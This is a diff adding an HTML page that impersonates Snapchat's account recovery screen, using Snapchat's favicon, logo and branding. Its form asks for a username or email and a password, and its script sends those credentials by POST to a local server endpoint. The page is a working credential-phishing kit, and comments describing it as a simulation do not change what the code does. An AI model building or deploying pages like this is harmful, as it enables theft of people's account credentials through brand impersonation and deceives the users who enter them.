@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<haed>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat | recover your account</title>
+    <link href="https://www.snapchat.com/static-assets/images/favicon.ico" rel="icon" type="image/x-icon">
+    <link rel="stylesheet" href="css.css">
+</haed>
+
+<body>
+    <div class="logo-bg">
+        <img src="Snapchat-Logo-2013.png" alt="Snapchat Logo" class="logo">
+    </div>
+    <div class="container">
+        <h2>Recover your account</h2>
+        <p>Enter your details associated with your Snapchat account to recover it.</p>
+        <form method="POST">
+            <span> username or email address</span>
+            <input type="text" name="username_or_email" placeholder="Username or Email" required>
+            <span> password</span>
+            <input type="password" name="password" placeholder="Password" required>
+            <span>Confirm password</span>
+            <input type="password" name="confirm_password" placeholder="Confirm Password" required><br><br>
+            <button type="submit">Recover Account</button>
+        </form>
+    </div>
+    <div class="error-container">
+        <div class="error-message">
+            <div class="error">Invalid username or password. <br>The account may not exist or the credentials are
+                incorrect.<br>Please try again.</div>
+        </div>
+    </div>
+</body>
+<script>
+    // Simulate form submission and error handling
+    const form = document.querySelector('form');
+    const errorContainer = document.querySelector('.error-container');
+    const usernameOrEmailInput = form.querySelector('input[name="username_or_email"]');
+    const passwordInput = form.querySelector('input[name="password"]');
+    const confirmPasswordInput = form.querySelector('input[name="confirm_password"]');
+    const button = form.querySelector('button');
+
+    function toggleButtonActive() {
+        if (usernameOrEmailInput.value !== '' || passwordInput.value !== '' || confirmPasswordInput.value !== '') {
+            button.classList.add('active'); // Add active class to button when all fields are filled
+        }
+        else {
+            button.classList.remove('active'); // Remove active class if any field is empty
+        }
+    }
+
+    usernameOrEmailInput.addEventListener('input', toggleButtonActive);
+    passwordInput.addEventListener('input', toggleButtonActive);
+    confirmPasswordInput.addEventListener('input', toggleButtonActive);
+
+    form.addEventListener('submit', async function (event) {
+        event.preventDefault(); // Prevent actual form submission
+
+        setTimeout(() => {
+            errorContainer.style.display = 'none'; // Hide error message after 5 seconds
+        }, 5000);
+
+        const usernameOrEmail = usernameOrEmailInput.value;
+        const password = passwordInput.value;
+        const confirmPassword = confirmPasswordInput.value;
+
+        if (usernameOrEmail === '' || password === '' || confirmPassword === '') {
+            errorContainer.style.display = 'block'; // Show error message
+        } else if (password !== confirmPassword) {
+            errorContainer.style.display = 'block'; // Show error message for password mismatch
+        } else {
+            errorContainer.style.display = 'none'; // Hide error message on successful validation
+            alert('Account recovery successful!'); // Simulate successful recovery
+        }
+        const response = await fetch('http://localhost:5000/register', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: usernameOrEmail, password })
+        });
+
+        const data = await response.json();
+        alert(data.message);
+    });
+
+</script>
+
+</html>
